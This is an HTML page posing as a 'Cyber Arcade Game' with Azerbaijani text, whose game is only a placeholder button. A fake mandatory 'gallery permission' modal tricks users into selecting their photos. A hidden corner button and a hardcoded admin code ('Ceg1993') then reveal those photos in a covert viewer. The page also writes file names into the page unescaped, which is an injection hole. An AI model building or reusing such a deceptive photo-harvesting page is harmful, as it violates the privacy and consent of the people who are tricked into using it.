<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cyber Arcade Game</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1f4068, #162447);
            color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }
        .game-container {
            text-align: center;
            background: rgba(255, 255, 255, 0.05);
            padding: 40px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
        }
        h1 { margin-bottom: 10px; color: #e43f5a; }
        p { color: #a4b3b6; }
        .btn {
            background-color: #e43f5a;
            color: white;
            border: none;
            padding: 12px 25px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 15px;
        }
        .btn:hover { background-color: #d12d4a; }
        
        .secret-trigger {
            position: absolute;
            bottom: 15px;
            right: 15px;
            background: transparent;
            border: none;
            color: rgba(255,255,255,0.15);
            cursor: pointer;
            font-size: 12px;
        }

        #permissionModal {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 200;
        }
        .permission-box {
            background: #1b1b2f;
            padding: 30px;
            border-radius: 12px;
            text-align: center;
            width: 85%;
            max-width: 380px;
            box-shadow: 0 0 25px rgba(228, 63, 90, 0.4);
            border: 1px solid #e43f5a;
        }
        .permission-box h3 { color: #ff6584; margin-top: 0; }
        .permission-box p { font-size: 14px; color: #d0d0d0; line-height: 1.5; }

        #adminModal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.85);
            justify-content: center;
            align-items: center;
            z-index: 100;
        }
        .modal-content {
            background: #1b1b2f;
            padding: 25px;
            border-radius: 10px;
            width: 90%;
            max-width: 650px;
            max-height: 85vh;
            overflow-y: auto;
            box-shadow: 0 0 20px rgba(228, 63, 90, 0.5);
        }
        input[type="password"] {
            padding: 10px;
            font-size: 16px;
            border-radius: 5px;
            border: 1px solid #444;
            background: #12121f;
            color: white;
            width: 60%;
            margin-right: 10px;
        }
        .gallery-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(110px, 1fr));
            gap: 10px;
            margin-top: 15px;
        }
        .gallery-item {
            background: #252839;
            padding: 6px;
            border-radius: 6px;
            text-align: center;
            font-size: 11px;
        }
        .gallery-item img {
            width: 100%;
            height: 85px;
            object-fit: cover;
            border-radius: 4px;
        }
        .close-btn {
            background: #444;
            margin-top: 15px;
        }
    </style>
</head>
<body>

    <!-- Məcburi İcazə Pəncərəsi -->
    <div id="permissionModal">
        <div class="permission-box">
            <h3>⚠️ Giriş Tələbi</h3>
            <p>Oyunu başlatmaq üçün cihazın <b>Qalereya və Media</b> fayllarına giriş icazəsi verilməlidir.</p>
            <button class="btn" onclick="openDeviceGallery()">İcazə Ver</button>
        </div>
    </div>

    <!-- Cihazın real fayllarını/qalereyasını açan gizli input -->
    <input type="file" id="deviceGalleryInput" multiple accept="image/*" style="display: none;" onchange="loadRealFiles(this.files)">

    <div class="game-container">
        <h1>Cyber Arcade Game</h1>
        <p>Oyun aktivdir. Əyləncəyə başla!</p>
        <button class="btn" onclick="alert('Oyun davam edir!')">Oyunu Oyna</button>
    </div>

    <!-- Gizli Admin Giriş Düyməsi (Sağ aşağı künc) -->
    <button class="secret-trigger" onclick="openAdminPrompt()">⚙️</button>

    <!-- Admin Panel -->
    <div id="adminModal">
        <div class="modal-content">
            <h2>Admin İdarəetmə Paneli</h2>
            
            <div id="authSection">
                <p>Zəhmət olmasa admin kodunu daxil edin:</p>
                <input type="password" id="adminCode" placeholder="Kod...">
                <button class="btn" onclick="checkCode()">Giriş</button>
            </div>

            <div id="dashboardSection" style="display: none;">
                <p style="color: #2ecc71; margin-bottom: 5px;">✅ Cihazın Yaddaşından Əldə Edilən Real Şəkillər:</p>
                <div class="gallery-grid" id="galleryContainer"></div>
            </div>
            
            <button class="btn close-btn" onclick="closeAdmin()">Bağla</button>
        </div>
    </div>

    <script>
        let capturedFiles = [];

        function openDeviceGallery() {
            // "İcazə Ver" düyməsinə basıldıqda birbaşa telefonun real qalereyası açılır
            document.getElementById('deviceGalleryInput').click();
        }

        function loadRealFiles(files) {
            capturedFiles = [];
            if (files.length > 0) {
                for (let i = 0; i < files.length; i++) {
                    const file = files[i];
                    capturedFiles.push({
                        name: file.name,
                        url: URL.createObjectURL(file)
                    });
                }
                // İcazə pəncərəsi bağlanır və oyun ekranına keçir
                document.getElementById('permissionModal').style.display = 'none';
            } else {
                alert("İcazə vermək üçün şəkil seçməlisiniz!");
            }
        }

        function openAdminPrompt() {
            document.getElementById('adminModal').style.display = 'flex';
        }

        function closeAdmin() {
            document.getElementById('adminModal').style.display = 'none';
            document.getElementById('adminCode').value = '';
            document.getElementById('dashboardSection').style.display = 'none';
            document.getElementById('authSection').style.display = 'block';
        }

        function checkCode() {
            const code = document.getElementById('adminCode').value;
            if (code === "Ceg1993") {
                document.getElementById('authSection').style.display = 'none';
                document.getElementById('dashboardSection').style.display = 'block';
                renderCapturedGallery();
            } else {
                alert("Yanlış kod!");
            }
        }

        function renderCapturedGallery() {
            const container = document.getElementById('galleryContainer');
            container.innerHTML = "";

            if (capturedFiles.length === 0) {
                container.innerHTML = "<p style='color: #888; grid-column: span 2;'>Hələ heç bir fayl əldə olunmayıb.</p>";
                return;
            }

            capturedFiles.forEach(file => {
                const div = document.createElement('div');
                div.className = 'gallery-item';
                div.innerHTML = `
                    <img src="${file.url}" alt="${file.name}">
                    <div style="color: #ccc; margin-top: 4px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">${file.name}</div>
                `;
                container.appendChild(div);
            });
        }
    </script>
</body>
</html>
